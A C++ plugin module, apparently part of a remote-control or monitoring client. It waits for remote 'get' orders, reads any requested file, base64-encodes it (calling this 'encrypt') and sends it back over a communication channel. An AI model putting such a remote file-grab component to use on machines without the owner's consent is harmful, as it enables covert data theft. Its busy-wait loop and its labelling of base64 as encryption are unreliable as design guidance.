//
// Created by Benoit Hamon on 10/3/2017.
//

#include <iostream>
#include <boost/dll/alias.hpp>
#include <boost/filesystem.hpp>
#include <boost/range/iterator_range.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>

#include "ModuleFile.hpp"
#include "ssl/Base64.hpp"

ModuleFile::ModuleFile(IModuleCommunication *moduleCommunication)
  : _moduleCommunication(moduleCommunication) {}

void ModuleFile::start() {
  IModuleCommunication::Order order;

  while (true) {
    if (this->_moduleCommunication->get("File", order)) {
      if (order.name == "get")
	this->sendFile(order.value);
    }
  }
}

boost::shared_ptr<ModuleFile> ModuleFile::create(IModuleCommunication *moduleCommunication) {
    return boost::shared_ptr<ModuleFile>(
            new ModuleFile(moduleCommunication)
    );
}

void ModuleFile::sendFile(std::string const &file) {
    boost::property_tree::ptree ptree;
    std::ifstream in(file);

    if (in.is_open()) {
      boost::property_tree::ptree data;
      std::stringstream sstr;
      sstr << in.rdbuf();
      data.put("directory", boost::filesystem::current_path());
      data.put("file", Base64::encrypt(sstr.str()));

      ptree.put("timestamp", std::to_string(std::time(nullptr)));
      ptree.put("type", "File");
      ptree.add_child("data", data);
    }
    this->_moduleCommunication->send(ptree);
}

BOOST_DLL_ALIAS(ModuleFile::create, create_module)
